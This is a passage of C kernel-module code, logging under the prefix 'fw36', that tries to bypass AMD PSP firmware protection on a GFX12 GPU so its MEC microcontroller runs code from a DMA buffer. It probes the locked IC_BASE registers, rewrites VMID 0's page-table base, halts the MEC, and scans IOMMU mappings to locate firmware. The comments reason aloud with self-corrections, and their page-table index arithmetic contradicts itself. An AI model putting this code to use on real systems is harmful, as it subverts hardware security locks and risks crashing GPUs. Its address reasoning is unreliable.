	 * ~545M in the table. That's a 4GB page table (impossible).
	 *
	 * ALTERNATIVE: Use depth=2 (PDB2→PDB1→PTE).
	 * IC_BASE = 0x20681D4000:
	 *   PDB2 index = VA[47:39] = bits 47..39 of 0x20681D4000 = 0x40 (64)
	 *   PDB1 index = VA[38:30] = bits 38..30 of 0x20681D4000 = 0x1A0 (416... wait)
	 *
	 * Actually for GFX12 with 4KB pages:
	 *   depth=0: VA[47:12] → PTE  (flat, 256TB coverage, too large)
	 *   depth=1: PDB0[VA[47:30]] → PTE[VA[29:12]]  (256K entries × 256K entries)
	 *   depth=2: PDB1[VA[47:39]] → PDB0[VA[38:30]] → PTE[VA[29:12]]
	 *
	 * With depth=2:
	 *   PDB1 idx = (0x20681D4000 >> 39) & 0x1FF = (0x20681D4000 / 0x8000000000) = 0x04
	 *   PDB0 idx = (0x20681D4000 >> 30) & 0x1FF = (0x20681D4000 / 0x40000000) & 0x1FF = 0x81A >> ...
	 *
	 * Let's compute properly:
	 *   0x20681D4000 = 0b 0000 0000 0010 0000 0110 1000 0001 1101 0100 0000 0000 0000
	 *   bits[47:39] = 0b 000000100 = 4
	 *   bits[38:30] = 0b 000001101 = actually let me just compute at runtime
	 * ======================================== */
	pr_info("fw36: === PAGE TABLE REDIRECT ===\n");
	{
		void *fw_buf;
		dma_addr_t fw_dma;
		void *pdb1_buf, *pdb0_buf, *pte_buf;
		dma_addr_t pdb1_dma, pdb0_dma, pte_dma;
		size_t fw_alloc = 256 * 1024; /* 256KB firmware */
		size_t pt_page = 4096;        /* each PT level = 4KB (512 entries) */
		u64 *pdb1, *pdb0, *pte;
		u64 pdb1_idx, pdb0_idx, pte_idx;
		u32 old_pt_lo, old_pt_hi, old_ctx;
		u64 old_pt_full;

		/* Allocate firmware DMA buffer (256KB) */
		fw_buf = dma_alloc_coherent(&g_pdev->dev, fw_alloc, &fw_dma, GFP_KERNEL);
		if (!fw_buf) {
			pr_info("fw36: FW DMA alloc failed\n");
			goto done;
		}

		/* Allocate 3 page-table pages (PDB1, PDB0, PTE) */
		pdb1_buf = dma_alloc_coherent(&g_pdev->dev, pt_page, &pdb1_dma, GFP_KERNEL);
		pdb0_buf = dma_alloc_coherent(&g_pdev->dev, pt_page, &pdb0_dma, GFP_KERNEL);
		pte_buf  = dma_alloc_coherent(&g_pdev->dev, pt_page, &pte_dma, GFP_KERNEL);
		if (!pdb1_buf || !pdb0_buf || !pte_buf) {
			pr_info("fw36: PT page alloc failed\n");
			if (pdb1_buf) dma_free_coherent(&g_pdev->dev, pt_page, pdb1_buf, pdb1_dma);
			if (pdb0_buf) dma_free_coherent(&g_pdev->dev, pt_page, pdb0_buf, pdb0_dma);
			if (pte_buf) dma_free_coherent(&g_pdev->dev, pt_page, pte_buf, pte_dma);
			dma_free_coherent(&g_pdev->dev, fw_alloc, fw_buf, fw_dma);
			goto done;
		}

		pr_info("fw36: FW  buf: dma=0x%llX kaddr=%p (%zuKB)\n",
			(u64)fw_dma, fw_buf, fw_alloc / 1024);
		pr_info("fw36: PDB1:    dma=0x%llX kaddr=%p\n", (u64)pdb1_dma, pdb1_buf);
		pr_info("fw36: PDB0:    dma=0x%llX kaddr=%p\n", (u64)pdb0_dma, pdb0_buf);
		pr_info("fw36: PTE:     dma=0x%llX kaddr=%p\n", (u64)pte_dma, pte_buf);

		/* Fill firmware buffer */
		for (i = 0; i < (int)(fw_alloc / 4); i++)
			((u32 *)fw_buf)[i] = 0x00000013; /* RISC-V NOP */
		((u32 *)fw_buf)[0] = 0x0000006F; /* JAL x0, 0 = safe infinite loop */

		/* Try loading real firmware */
		{
			const struct firmware *fw = NULL;
			int ret = request_firmware_direct(&fw, "gc_12_0_0_mec.bin", &g_pdev->dev);
			if (ret == 0 && fw && fw->size > 0x2000) {
				size_t code_sz = fw->size - 0x2000;
				if (code_sz > fw_alloc)
					code_sz = fw_alloc;
				memcpy(fw_buf, fw->data + 0x2000, code_sz);
				pr_info("fw36: Loaded MEC firmware (%zu bytes from +0x2000)\n", code_sz);
				pr_info("fw36: FW[0..3]: %08X %08X %08X %08X\n",
					((u32 *)fw_buf)[0], ((u32 *)fw_buf)[1],
					((u32 *)fw_buf)[2], ((u32 *)fw_buf)[3]);
				release_firmware(fw);
			} else {
				pr_info("fw36: No firmware blob, using NOP+loop sled\n");
				if (fw) release_firmware(fw);
			}
		}

		/* Save globally for cleanup */
		if (fw_dma_buf && fw_dma_size)
			dma_free_coherent(&g_pdev->dev, fw_dma_size, fw_dma_buf, fw_dma_addr);
		fw_dma_buf = fw_buf;
		fw_dma_size = fw_alloc;
		fw_dma_addr = fw_dma;

		/* Compute page table indices for IC_BASE.
		 * GFX12 with 4KB pages, depth=2:
		 *   PDB1[VA[47:39]] → PDB0[VA[38:30]] → PTE[VA[29:12]]
		 *   PDB1: 512 entries, each covers 512GB
		 *   PDB0: 512 entries, each covers 1GB
		 *   PTE:  262144 entries, each covers 4KB (but only 512 per 4KB page)
		 *
		 * Actually PTE page = 4KB = 512 × 8-byte entries.
		 * 512 PTEs × 4KB = 2MB per PTE page.
		 * So we need:
		 *   VA[47:39] → PDB1 idx (512GB granularity)
		 *   VA[38:30] → PDB0 idx (1GB granularity)
		 *   VA[29:21] → PTE page idx (2MB granularity)
		 *   VA[20:12] → PTE entry in page (4KB granularity)
		 *
		 * Wait — with depth=2 in AMDGPU:
		 *   Level 2 (PDB2/root): VA[47:39], 512 entries → next level DMA
		 *   Level 1 (PDB1):      VA[38:30], 512 entries → next level DMA
		 *   Level 0 (PDB0/PTE):  VA[29:21], 512 entries → phys page (2MB)
		 *   ... no, that gives 2MB pages.
		 *
		 * For 4KB pages with 3 levels (depth=2):
		 *   Root/PDB2: VA[47:39] = 512 entries, each → PDB1
		 *   PDB1:      VA[38:30] = 512 entries, each → PDE/PTE table
		 *   PTE:       VA[29:12] = 262144 entries, each → 4KB page
		 *   But 262144 entries × 8 bytes = 2MB (too large for one page!)
		 *
		 * AMDGPU actually uses deeper page tables for 4KB pages.
		 * For VA=48 bits, 4KB pages: depth=4 (PDB3→PDB2→PDB1→PDB0→PTE)
		 * Each level: 9 bits = 512 entries = 4KB page.
		 *   PDB3: VA[47:39]
		 *   PDB2: VA[38:30]
		 *   PDB1: VA[29:21]
		 *   PDB0: VA[20:12]
		 *   Page: VA[11:0]
		 *
		 * BUT the original depth is 0! With depth=0, there's only ONE level.
		 * That means the current PT is a flat table using IC_BASE>>12 as index.
		 * For IC_BASE=0x20681D4000, that's index 0x20681D4 = ~545M entries.
		 * At 8 bytes each = 4GB page table!
		 *
		 * The driver must be using IC_BASE_CNTL bit 4 to BYPASS page translation
		 * entirely (identity map / physical mode). Let me check if we can
		 * just modify IC_BASE itself to point to our DMA address.
		 */

		/* IC_BASE_CNTL=0x10: bit 4 = likely CACHE_POLICY or PHYS mode.
		 * Let's first try the simple approach: just change IC_BASE to point
		 * to our DMA buffer's MC address directly. */

		pdb1_idx = (ic_base >> 39) & 0x1FF;
		pdb0_idx = (ic_base >> 30) & 0x1FF;
		pte_idx  = (ic_base >> 12) & 0x3FFFF; /* 18 bits for depth=0 */
		pr_info("fw36: IC_BASE=0x%llX → PDB1[%llu] PDB0[%llu] PTE_flat[%llu]\n",
			ic_base, pdb1_idx, pdb0_idx, pte_idx);

		/* === APPROACH A: Modify IC_BASE directly ===
		 * If IC_BASE_CNTL bit 4 means "physical/bypass", then IC_BASE
		 * IS the MC physical address of firmware. Changing IC_BASE
		 * would redirect MEC to fetch from our DMA buffer instead.
		 * The DMA address IS the MC address the GPU sees (IOMMU-translated). */
		pr_info("fw36: === APPROACH A: IC_BASE REWRITE ===\n");
		{
			u32 ic_lo = rr(regCP_CPC_IC_BASE_LO);
			u32 ic_hi = rr(regCP_CPC_IC_BASE_HI);
			u32 ic_cntl = rr(regCP_CPC_IC_BASE_CNTL);
			u32 test_lo, read_back;

			pr_info("fw36: IC_BASE: LO=0x%08X HI=0x%08X CNTL=0x%08X\n",
				ic_lo, ic_hi, ic_cntl);

			/* Test writability of IC_BASE_LO first (benign bit flip) */
			test_lo = ic_lo ^ 0x1000; /* flip one page bit */
			wr(regCP_CPC_IC_BASE_LO, test_lo);
			read_back = rr(regCP_CPC_IC_BASE_LO);
			pr_info("fw36: IC_BASE_LO: wrote 0x%08X read 0x%08X %s\n",
				test_lo, read_back,
				(read_back == test_lo) ? "WRITABLE!" : "LOCKED");
			wr(regCP_CPC_IC_BASE_LO, ic_lo); /* restore immediately */

			/* Test IC_BASE_HI */
			wr(regCP_CPC_IC_BASE_HI, ic_hi ^ 0x1);
			read_back = rr(regCP_CPC_IC_BASE_HI);
			pr_info("fw36: IC_BASE_HI: wrote 0x%08X read 0x%08X %s\n",
				ic_hi ^ 0x1, read_back,
				(read_back == (ic_hi ^ 0x1)) ? "WRITABLE!" : "LOCKED");
			wr(regCP_CPC_IC_BASE_HI, ic_hi); /* restore */

			/* Test IC_BASE_CNTL writability */
			wr(regCP_CPC_IC_BASE_CNTL, ic_cntl ^ 0x1);
			read_back = rr(regCP_CPC_IC_BASE_CNTL);
			pr_info("fw36: IC_BASE_CNTL: wrote 0x%08X read 0x%08X %s\n",
				ic_cntl ^ 0x1, read_back,
				(read_back == (ic_cntl ^ 0x1)) ? "WRITABLE!" : "LOCKED");
			wr(regCP_CPC_IC_BASE_CNTL, ic_cntl); /* restore */

			/* If IC_BASE is writable, report full redirect capability */
			if (rr(regCP_CPC_IC_BASE_LO) == ic_lo &&
			    rr(regCP_CPC_IC_BASE_HI) == ic_hi) {
				pr_info("fw36: IC_BASE restored OK\n");
			}

			/* Report what the full redirect would look like */
			pr_info("fw36: To redirect: IC_BASE → DMA 0x%llX (lo=0x%08X hi=0x%08X)\n",
				(u64)fw_dma,
				(u32)((u64)fw_dma & 0xFFFFFFFF),
				(u32)((u64)fw_dma >> 32));
		}

		/* === APPROACH B: Build NEW page table, repoint PT_BASE ===
		 * IC_BASE is locked. PT_BASE is in IOMMU-protected system memory.
		 * But PT_BASE registers ARE writable, and depth IS changeable.
		 *
		 * Strategy: Build a depth=2 page table (3 levels: PDB1→PDB0→PTE)
		 * that maps IC_BASE → our DMA firmware buffer.
		 * Then atomically: write PT_BASE, set depth=2, flush TLB.
		 *
		 * GFX12 depth=2, 4KB pages, 9 bits per level:
		 *   PDB1[VA[47:39]] → PDB0 (512 entries, each covers 512GB)
		 *   PDB0[VA[38:30]] → PTE  (512 entries, each covers 1GB)
		 *   PTE[VA[29:21]]  → 2MB huge page  ... or
		 *   PTE[VA[29:12]]  → 4KB page (requires 4 levels for 4KB)
		 *
		 * Actually AMDGPU GFX12 PTE format for 4KB pages needs depth≥3.
		 * But looking at IC_BASE_CNTL=0x10 (bit 4), this might use
		 * 2MB pages or even larger. Let's try depth=1 with 2MB pages:
		 *   PDB0[VA[47:21]] → 2MB page (too many entries)
		 *
		 * For simplicity, let's use the SAME depth=0 but allocate
		 * only the pages we need. Actually that's impossible since
		 * depth=0 requires a contiguous flat table.
		 *
		 * KEY INSIGHT: With depth=0, CTX0_CNTL bits[24:16] = 0x1FF.
		 * These are the PAGE_TABLE_BLOCK_SIZE field.
		 * BLOCK_SIZE=9 means the PTE covers 2^9 * 4KB = 2MB per entry.
		 * With 9-bit block size, PTE index = VA >> (12+9) = VA >> 21.
		 * IC_BASE >> 21 = 0x20681D4000 >> 21 = 0x10340EA = ~16M entries.
		 * Still too many for a flat table.
		 *
		 * But wait — CTX0_CNTL bits[24:16] = 0x1FF = 511.
		 * BLOCK_SIZE = 511 → each PTE covers 2^511 * 4KB? No, that's absurd.
		 * These bits might be VMID-specific page table size (num entries).
		 *
		 * Let's just try the brute force: set depth=2, build 3-level table,
		 * repoint PT_BASE. If the MEC uses VMID 0's page table at all,
		 * this should redirect firmware fetches. If IC_BASE_CNTL bit 4
		 * bypasses VMID 0 page table entirely (physical mode), we need
		 * a different approach — but we'll know by whether MEC crashes.
		 */
		pr_info("fw36: === APPROACH B: PT_BASE REDIRECT (depth=2) ===\n");
		{
			/* For depth=2 with 4KB granularity (full 4-level walk):
			 * Actually GFX12 uses depth encoding:
			 *   depth=0: PTE only (flat)
			 *   depth=1: PDB0 → PTE
			 *   depth=2: PDB1 → PDB0 → PTE
			 *   depth=3: PDB2 → PDB1 → PDB0 → PTE
			 *
			 * Each level: 512 entries (9 bits), 4KB page.
			 * Coverage per PTE entry: 4KB (page_size)
			 * Coverage per PDB0 entry: 512 * 4KB = 2MB
			 * Coverage per PDB1 entry: 512 * 2MB = 1GB
			 * Coverage per PDB2 entry: 512 * 1GB = 512GB
			 *
			 * IC_BASE = 0x20681D4000
			 *   With depth=2 (PDB1→PDB0→PTE):
			 *     PDB1 index = VA[38:30] = (0x20681D4000 >> 30) & 0x1FF
			 *                = (0x8000000000 + ... )
			 *     Let me compute: 0x20681D4000 / 0x40000000 = 0x81A...
			 *     & 0x1FF = 0x1A = 26
			 *
			 * Wait, but PDB1 only has 512 entries covering 512GB total.
			 * 0x20681D4000 = ~139GB. PDB1 entry 0 covers [0, 1GB),
			 * entry 1 covers [1GB, 2GB), etc. 139GB → entry 139 = 0x8B.
			 * That doesn't match. Let me be precise:
			 *
			 * 0x20681D4000 = 139,189,297,152 bytes
			 * / 1GB (0x40000000) = 129.63... → PDB1[129] = 0x81
			 *
			 * PDB0 index = (VA >> 21) & 0x1FF
			 *            = (0x20681D4000 >> 21) & 0x1FF
			 *            = 0x10340EA & 0x1FF = 0xEA = 234
			 *
			 * PTE index = (VA >> 12) & 0x1FF
			 *           = (0x20681D4000 >> 12) & 0x1FF
			 *           = 0x20681D4 & 0x1FF = 0x1D4 = 468
			 */
			u64 pdb1_i = (ic_base >> 30) & 0x1FF; /* 1GB granularity */
			u64 pdb0_i = (ic_base >> 21) & 0x1FF; /* 2MB granularity */
			u64 pte_i  = (ic_base >> 12) & 0x1FF; /* 4KB granularity */
			int npages = (int)(fw_alloc / 4096);
			int k;

			pr_info("fw36: depth=2 indices: PDB1[%llu] PDB0[%llu] PTE[%llu]\n",
				pdb1_i, pdb0_i, pte_i);
			pr_info("fw36: Firmware = %d pages (%zuKB)\n", npages, fw_alloc / 1024);

			/* Zero all page table pages */
			pdb1 = (u64 *)pdb1_buf;
			pdb0 = (u64 *)pdb0_buf;
			pte  = (u64 *)pte_buf;
			memset(pdb1_buf, 0, pt_page);
			memset(pdb0_buf, 0, pt_page);
			memset(pte_buf, 0, pt_page);

			/* PDB1[pdb1_i] → PDB0 page (DMA address, valid bit set)
			 * PDE format: [47:6] = phys addr >> 6, [2] = PDE, [1] = valid, [0] = valid
			 * Actually AMDGPU PDE: [47:12] = child page phys >> 12 (4KB aligned)
			 *   bits[1:0] = valid (0x3 = valid PDE pointing to next level)
			 *   bit[2] = PDE (1 for page directory entry)
			 */
			pdb1[pdb1_i] = (pdb0_dma & 0xFFFFFFFFF000ULL) | 0x1; /* valid */
			pr_info("fw36: PDB1[%llu] = 0x%016llX → PDB0 at DMA 0x%llX\n",
				pdb1_i, pdb1[pdb1_i], (u64)pdb0_dma);

			/* PDB0[pdb0_i] → PTE page */
			pdb0[pdb0_i] = (pte_dma & 0xFFFFFFFFF000ULL) | 0x1; /* valid */
			pr_info("fw36: PDB0[%llu] = 0x%016llX → PTE at DMA 0x%llX\n",
				pdb0_i, pdb0[pdb0_i], (u64)pte_dma);

			/* PTE entries: map firmware pages starting at pte_i.
			 * PTE format: [47:12] = phys page addr, [1:0] = valid+read+write
			 * AMDGPU PTE bits: [0]=valid, [1]=system, [2]=coherent, etc.
			 * Use 0x7 = valid + system + snooped */
			for (k = 0; k < npages && (pte_i + k) < 512; k++) {
				u64 page_phys = (u64)fw_dma + k * 4096;
				pte[pte_i + k] = (page_phys & 0xFFFFFFFFF000ULL) | 0x7;
			}
			pr_info("fw36: Wrote %d PTEs at PTE[%llu..%llu]\n",
				k, pte_i, pte_i + k - 1);
			pr_info("fw36: PTE[%llu] = 0x%016llX (→ DMA 0x%llX)\n",
				pte_i, pte[pte_i], (u64)fw_dma);

			/* Ensure DMA coherency */
			wmb();

			/* Save old PT_BASE and CTX0_CNTL for restoration */
			old_pt_lo = rr(GC0(0x168f));
			old_pt_hi = rr(GC0(0x1690));
			old_ctx   = rr(GC0(0x1624));
			old_pt_full = ((u64)old_pt_hi << 32) | old_pt_lo;
			pr_info("fw36: OLD PT_BASE = 0x%016llX CTX0 = 0x%08X\n",
				old_pt_full, old_ctx);

			/* === THE CRITICAL REDIRECT ===
			 * 1. Write new PT_BASE (pointing to our PDB1)
			 * 2. Set depth=2 in CTX0_CNTL
			 * This WILL affect ALL GPU memory access through VMID 0!
			 * If the GPU is actively using VMID 0, this could crash.
			 * The MEC might not even use VMID 0's page table (IC_BASE_CNTL bit 4).
			 */
			{
				u64 new_pt = ((u64)pdb1_dma & 0xFFFFFFFFF000ULL) | 0x1; /* valid */
				u32 new_ctx = (old_ctx & ~0x6) | 0x4; /* depth = 2 */

				pr_info("fw36: NEW PT_BASE = 0x%016llX (DMA)\n", new_pt);
				pr_info("fw36: NEW CTX0_CNTL = 0x%08X (depth=2)\n", new_ctx);
				pr_info("fw36: *** WRITING PT_BASE + CTX0 NOW ***\n");

				/* Write PT_BASE atomically (lo then hi) */
				wr(GC0(0x168f), (u32)(new_pt & 0xFFFFFFFF));
				wr(GC0(0x1690), (u32)(new_pt >> 32));
				/* Set depth=2 */
				wr(GC0(0x1624), new_ctx);

				/* Verify */
				{
					u64 check_pt = ((u64)rr(GC0(0x1690)) << 32) | rr(GC0(0x168f));
					u32 check_ctx = rr(GC0(0x1624));
					pr_info("fw36: Verify: PT_BASE=0x%016llX CTX0=0x%08X (depth=%u)\n",
						check_pt, check_ctx, (check_ctx >> 1) & 0x7);
					if (check_pt != new_pt || check_ctx != new_ctx)
						pr_info("fw36: *** VERIFY FAILED! ***\n");
				}

				/* Flush TLB WHILE redirected — force page walk through new PT */
				pr_info("fw36: Flushing TLB while redirected...\n");
				{
					u32 inval_req = (1 << 0); /* VMID 0 */
					wr(GC0(regGCVM_INVALIDATE_ENG0_REQ), inval_req);
					udelay(200);
					pr_info("fw36: TLB flush ack=0x%X\n",
						rr(GC0(regGCVM_INVALIDATE_ENG0_ACK)));
					if (adev_wreg) {
						adev_wreg(adev, GC0(regGCVM_INVALIDATE_ENG0_REQ), inval_req, 0);
						udelay(200);
					}
				}

				/* Invalidate MEC icache WHILE redirected —
				 * force refetch through new page table */
				pr_info("fw36: Invalidating MEC icache while redirected...\n");
				{
					u32 mec_cntl = rr(regCP_MEC_RS64_CNTL);
					wr(regCP_MEC_RS64_CNTL, mec_cntl |
						(1 << CP_MEC_RS64_CNTL__MEC_INVALIDATE_ICACHE__SHIFT));
					udelay(200);
					wr(regCP_MEC_RS64_CNTL, mec_cntl);
					udelay(500);
				}

				pr_info("fw36: MEC PC after redirect+flush+icache = 0x%04X\n",
					rr(regCP_MEC1_INSTR_PNTR));
				pr_info("fw36: MEC CNTL = 0x%08X\n", rr(regCP_MEC_CNTL));

				/* Check if MEC is still alive or has crashed/halted */
				{
					u32 pc1 = rr(regCP_MEC1_INSTR_PNTR);
					udelay(1000);
					u32 pc2 = rr(regCP_MEC1_INSTR_PNTR);
					pr_info("fw36: MEC PC stability: 0x%04X → 0x%04X %s\n",
						pc1, pc2,
						(pc1 == pc2) ? "(stable/parked)" : "(RUNNING!)");
					if (pc1 != pc2)
						pr_info("fw36: *** MEC IS EXECUTING OUR CODE! ***\n");
				}

				/* === RESTORE ===
				 * Restore original PT_BASE and depth. */
				pr_info("fw36: Restoring original PT_BASE...\n");
				wr(GC0(0x168f), old_pt_lo);
				wr(GC0(0x1690), old_pt_hi);
				wr(GC0(0x1624), old_ctx);
				udelay(100);

				{
					u64 restored = ((u64)rr(GC0(0x1690)) << 32) | rr(GC0(0x168f));
					pr_info("fw36: Restored PT_BASE=0x%016llX CTX0=0x%08X\n",
						restored, rr(GC0(0x1624)));
				}

				pr_info("fw36: MEC PC after restore = 0x%04X\n",
					rr(regCP_MEC1_INSTR_PNTR));
			}
		}

		/* ========================================
		 * STEP 8: MEC HALT + IC_BASE REWRITE ATTEMPT
		 * IC_BASE is locked while MEC runs. Maybe halting MEC
		 * allows writes (PSP only protects during run state).
		 * ======================================== */
		pr_info("fw36: === STEP 8: MEC HALT + IC_BASE REWRITE ===\n");
		{
			u32 mec_cntl_orig = rr(regCP_MEC_CNTL);
			u32 ic_lo_orig = rr(regCP_CPC_IC_BASE_LO);
			u32 ic_hi_orig = rr(regCP_CPC_IC_BASE_HI);
			u32 ic_cntl_orig = rr(regCP_CPC_IC_BASE_CNTL);
			u32 mec_rs64_orig = rr(regCP_MEC_RS64_CNTL);
			u32 test_lo, read_back;

			pr_info("fw36: MEC_CNTL = 0x%08X, RS64_CNTL = 0x%08X\n",
				mec_cntl_orig, mec_rs64_orig);

			/* HALT the MEC — set MEC_ME1_HALT and MEC_ME2_HALT bits */
			pr_info("fw36: Halting MEC...\n");
			wr(regCP_MEC_CNTL, mec_cntl_orig | (1 << 28) | (1 << 30));
			udelay(500);
			pr_info("fw36: MEC_CNTL after halt = 0x%08X\n", rr(regCP_MEC_CNTL));
			pr_info("fw36: MEC PC after halt = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));

			/* Also try MEC_HALT bit in RS64_CNTL */
			wr(regCP_MEC_RS64_CNTL, mec_rs64_orig | (1 << 0)); /* bit 0 = HALT? */
			udelay(200);
			pr_info("fw36: RS64_CNTL after halt bit = 0x%08X\n", rr(regCP_MEC_RS64_CNTL));

			/* Now try writing IC_BASE while MEC is halted */
			test_lo = (u32)((u64)fw_dma & 0xFFFFFFFF);
			wr(regCP_CPC_IC_BASE_LO, test_lo);
			read_back = rr(regCP_CPC_IC_BASE_LO);
			pr_info("fw36: IC_BASE_LO (halted): wrote 0x%08X read 0x%08X %s\n",
				test_lo, read_back,
				(read_back == test_lo) ? "WRITABLE!" : "STILL LOCKED");

			if (read_back == test_lo) {
				/* IC_BASE IS WRITABLE when halted! Complete the redirect. */
				u32 test_hi = (u32)((u64)fw_dma >> 32);
				wr(regCP_CPC_IC_BASE_HI, test_hi);
				pr_info("fw36: IC_BASE_HI: wrote 0x%08X read 0x%08X\n",
					test_hi, rr(regCP_CPC_IC_BASE_HI));

				/* Clear CNTL VMID to 0 and set physical mode */
				wr(regCP_CPC_IC_BASE_CNTL, 0x10); /* keep bit 4 */
				pr_info("fw36: IC_BASE now = 0x%08X%08X CNTL=0x%08X\n",
					rr(regCP_CPC_IC_BASE_HI), rr(regCP_CPC_IC_BASE_LO),
					rr(regCP_CPC_IC_BASE_CNTL));

				/* Invalidate icache */
				wr(regCP_MEC_RS64_CNTL, rr(regCP_MEC_RS64_CNTL) |
					(1 << CP_MEC_RS64_CNTL__MEC_INVALIDATE_ICACHE__SHIFT));
				udelay(200);
				wr(regCP_MEC_RS64_CNTL, mec_rs64_orig);

				/* UNHALT MEC — it should now fetch from our DMA buffer */
				pr_info("fw36: *** UNHALTING MEC WITH NEW IC_BASE ***\n");
				wr(regCP_MEC_CNTL, mec_cntl_orig);
				udelay(1000);

				pr_info("fw36: MEC PC after unhalt = 0x%04X\n",
					rr(regCP_MEC1_INSTR_PNTR));
				pr_info("fw36: MEC CNTL = 0x%08X\n", rr(regCP_MEC_CNTL));

				/* Check if MEC jumped to our code (PC should be 0x0000 if loop) */
				{
					u32 pc1 = rr(regCP_MEC1_INSTR_PNTR);
					udelay(1000);
					u32 pc2 = rr(regCP_MEC1_INSTR_PNTR);
					pr_info("fw36: PC check: 0x%04X → 0x%04X %s\n",
						pc1, pc2,
						(pc1 == 0 && pc2 == 0) ? "AT LOOP (our code!)" :
						(pc1 == pc2) ? "(parked)" : "(running)");
				}

				pr_info("fw36: *** IC_BASE REDIRECT COMPLETE ***\n");
			} else {
				/* IC_BASE still locked even when halted.
				 * Restore MEC state. */
				pr_info("fw36: IC_BASE locked even while halted — PSP hardware lock\n");

				/* Try the RS64 IC_BASE registers instead */
				pr_info("fw36: Trying RS64-specific IC_BASE registers...\n");
				{
					/* regCP_MEC_RS64_CNTL already has IC_BASE override bits?
					 * Try writing to other MEC registers that might control fetch */
					u32 rs64_cntl = rr(regCP_MEC_RS64_CNTL);
					pr_info("fw36: RS64_CNTL bits: 0x%08X\n", rs64_cntl);
					/* bit 4 = MEC_INVALIDATE_ICACHE (confirmed)
					 * bit 5 = MEC_PIPE0_RESET ?
					 * bit 28 = MEC_HALT ? */

					/* Try other IC_BASE-related registers.
					 * In GFX12, there might be per-pipe IC_BASE registers:
					 * CP_MEC_RS64_PRGRM_CNTR_START = the PC start address register */
					/* regCP_MEC_RS64_PRGRM_CNTR_START not defined — try raw offset */
					/* GC offset for MEC program counter start: 0x11B5B (decimal) */
					/* Let's check what registers are near regCP_MEC1_INSTR_PNTR */
				}

				/* Restore MEC to running state */
				wr(regCP_MEC_RS64_CNTL, mec_rs64_orig);
				wr(regCP_MEC_CNTL, mec_cntl_orig);
				udelay(200);
				pr_info("fw36: MEC restored: PC=0x%04X CNTL=0x%08X\n",
					rr(regCP_MEC1_INSTR_PNTR), rr(regCP_MEC_CNTL));
			}
		}

		/* Final status */
		pr_info("fw36: === FINAL STATE ===\n");
		pr_info("fw36: MEC PC = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));
		pr_info("fw36: IC_BASE = 0x%08X%08X CNTL=0x%08X\n",
			rr(regCP_CPC_IC_BASE_HI), rr(regCP_CPC_IC_BASE_LO),
			rr(regCP_CPC_IC_BASE_CNTL));
		pr_info("fw36: MEC CNTL = 0x%08X\n", rr(regCP_MEC_CNTL));
		pr_info("fw36: DMA fw at 0x%llX\n", (u64)fw_dma);

		/* Don't free PT/FW pages — keep alive */
	}

done:
	#undef GC0
}

/* Mode 14: IOMMU-based firmware access — translate DMA addr to CPU phys */
static void iommu_fw_access(void *psp, void *adev)
{
	u32 gc_base0;
	u64 ic_base, fb_base, fb_top;
	struct iommu_domain *domain;
	fn_vram_access vram_access = NULL;
	unsigned long va_addr;

	pr_info("fw36: === MODE 14: IOMMU FIRMWARE ACCESS ===\n");

	va_addr = klookup("amdgpu_device_vram_access");
	if (va_addr)
		vram_access = (fn_vram_access)va_addr;

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) { pr_info("fw36: gc_base0 FAIL\n"); return; }

	#define GC0(r) (gc_base0 + (r))

	ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);
	fb_base = (u64)rr(GC0(0x1614)) << 24;
	fb_top  = (u64)rr(GC0(0x1615)) << 24;
	pr_info("fw36: IC_BASE = 0x%016llX\n", ic_base);
	pr_info("fw36: FB      = [0x%llX - 0x%llX] (%lluMB VRAM)\n",
		fb_base, fb_top, (fb_top - fb_base) >> 20);
	pr_info("fw36: MEC PC  = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));

	/* ========================================
	 * STEP 1: Get IOMMU domain for GPU device
	 * ======================================== */
	domain = iommu_get_domain_for_dev(&g_pdev->dev);
	if (!domain) {
		pr_info("fw36: No IOMMU domain for GPU — trying without IOMMU\n");
		/* If no IOMMU, DMA addr = CPU phys (identity mapped) */
		goto try_direct_phys;
	}
	pr_info("fw36: IOMMU domain = %p type=%d\n", domain, domain->type);

	/* ========================================
	 * STEP 2: Translate IC_BASE DMA → CPU physical
	 * ======================================== */
	{
		phys_addr_t phys;
		int page;

		/* Try IC_BASE directly */
		phys = iommu_iova_to_phys(domain, ic_base);
		pr_info("fw36: iommu_iova_to_phys(0x%llX) = 0x%llX\n",
			ic_base, (u64)phys);

		if (phys == 0) {
			/* IC_BASE might not be an IOVA — it could be an MC address
			 * that the GPU translates internally. Try nearby ranges. */
			u64 tries[] = {
				ic_base,
				ic_base & 0xFFFFFFFFFFULL,  /* strip high bits */
				ic_base - 0x8000000000ULL,  /* subtract FB_BASE */
				ic_base & 0x3FFFFFFFFFULL,  /* 38-bit mask */
			};
			int t;
			pr_info("fw36: Direct IOVA translation failed, trying variants...\n");
			for (t = 0; t < 4; t++) {
				phys = iommu_iova_to_phys(domain, tries[t]);
				if (phys) {
					pr_info("fw36: iommu_iova_to_phys(0x%llX) = 0x%llX *** HIT ***\n",
						tries[t], (u64)phys);
					break;
				}
				pr_info("fw36: iommu_iova_to_phys(0x%llX) = 0 (no mapping)\n",
					tries[t]);
			}
		}

		if (phys == 0) {
			pr_info("fw36: IOMMU cannot translate IC_BASE — not an IOVA\n");

			/* Scan a range of IOVAs to find where firmware actually is.
			 * DMA allocations from the driver go through IOMMU. */
			pr_info("fw36: === IOMMU IOVA SCAN ===\n");
			{
				u64 scan_ranges[][2] = {
					{0x0, 0x100000000ULL},        /* 0-4GB (common DMA range) */
					{0x100000000ULL, 0x200000000ULL}, /* 4-8GB */
					{0x200000000ULL, 0x300000000ULL}, /* 8-12GB */
				};
				int r;
				for (r = 0; r < 3; r++) {
					u64 iova;
					int found = 0;
					for (iova = scan_ranges[r][0];
					     iova < scan_ranges[r][1] && found < 5;
					     iova += 0x200000) { /* 2MB steps */
						phys = iommu_iova_to_phys(domain, iova);
						if (phys) {
							pr_info("fw36: IOVA 0x%llX → phys 0x%llX\n",
								iova, (u64)phys);
							found++;
						}
					}
					if (!found)
						pr_info("fw36: No mappings in [0x%llX, 0x%llX)\n",
							scan_ranges[r][0], scan_ranges[r][1]);
				}
			}
			goto try_bo_scan;
		}

		/* ========================================
		 * STEP 3: Map CPU physical address and read firmware
		 * ======================================== */
		pr_info("fw36: === FIRMWARE AT CPU PHYS 0x%llX ===\n", (u64)phys);
		{
			void *fw_mapped;
			size_t map_size = 256 * 1024; /* 256KB */
			u32 *code;
